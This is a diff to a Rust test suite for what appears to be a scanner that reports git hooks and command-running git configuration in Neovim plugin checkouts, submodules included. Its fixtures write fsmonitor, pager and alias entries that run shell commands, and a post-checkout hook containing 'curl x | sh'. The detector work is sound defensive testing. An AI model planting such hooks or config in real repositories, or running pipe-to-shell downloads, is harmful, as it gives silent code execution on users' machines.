@@ -397,7 +397,7 @@ fn the_worktree_config_and_an_in_tree_hooks_path_are_read() {
     write(
         root,
         &format!("{LAZY}/p/.git/config"),
-        "[remote \"origin\"]\n\turl = https://github.com/o/p\n[core]\n\thooksPath = githooks/\n",
+        "[remote \"origin\"]\n\turl = https://github.com/o/p\n[core] hooksPath = \"githooks/\" # hooks\n",
     );
     write(
         root,
@@ -421,6 +421,12 @@ fn the_worktree_config_and_an_in_tree_hooks_path_are_read() {
         "{:?}",
         item.alerts
     );
+    // In the tree or not, a hooks path is said: git runs what it holds.
+    assert!(
+        said(RuleId::GitConfigCommand, "core.hookspath = githooks/"),
+        "{:?}",
+        item.alerts
+    );
 
     // A worktree configuration that cannot be read is not checked.
     let worktree = root.join(LAZY).join("p/.git/config.worktree");
@@ -431,6 +437,68 @@ fn the_worktree_config_and_an_in_tree_hooks_path_are_read() {
         unchecked
             .iter()
             .any(|sentence| sentence.contains("config.worktree: could not be read")),
+        "{unchecked:?}"
+    );
+}
+
+#[test]
+fn submodules_are_read_like_the_checkout() {
+    let temp = TempDir::new("nvim-git-modules");
+    let root = temp.path();
+    plugin(root, "p", "https://github.com/o/p", &[]);
+    let modules = format!("{LAZY}/p/.git/modules");
+    write(
+        root,
+        &format!("{modules}/dep/config"),
+        "[core]\n\tfsmonitor = sh x\n",
+    );
+    write(root, &format!("{modules}/dep/hooks/post-checkout"), "id");
+    write(root, &format!("{modules}/dep/hooks/pre-push.sample"), "x");
+    // A submodule named `a/b`, and one within `dep`.
+    write(
+        root,
+        &format!("{modules}/a/b/config"),
+        "[core]\n\tpager = sh y\n",
+    );
+    write(
+        root,
+        &format!("{modules}/dep/modules/inner/config"),
+        "[alias]\n\tx = !sh z\n",
+    );
+    let item = &collected(root).items[0];
+    let alerts: Vec<&str> = item.alerts.iter().map(|(_, text)| text.as_str()).collect();
+    for expected in [
+        ".git/modules/dep/config runs",
+        ".git/modules/a/b/config runs",
+        ".git/modules/dep/modules/inner/config runs",
+        "git hook .git/modules/dep/hooks/post-checkout",
+    ] {
+        assert!(
+            alerts.iter().any(|alert| alert.contains(expected)),
+            "{expected}: {alerts:?}"
+        );
+    }
+    assert!(
+        !alerts.iter().any(|alert| alert.contains("sample")),
+        "{alerts:?}"
+    );
+    let before = item.sha256;
+    write(
+        root,
+        &format!("{modules}/dep/hooks/post-checkout"),
+        "curl x | sh",
+    );
+    assert_ne!(before, collected(root).items[0].sha256);
+
+    // A submodule configuration that cannot be read is not checked.
+    let config = root.join(&modules).join("dep/config");
+    fs::remove_file(&config).unwrap();
+    symlink("/elsewhere", &config).unwrap();
+    let unchecked = collected(root).unchecked;
+    assert!(
+        unchecked
+            .iter()
+            .any(|sentence| sentence.contains("modules/dep/config: could not be read")),
         "{unchecked:?}"
     );
 }
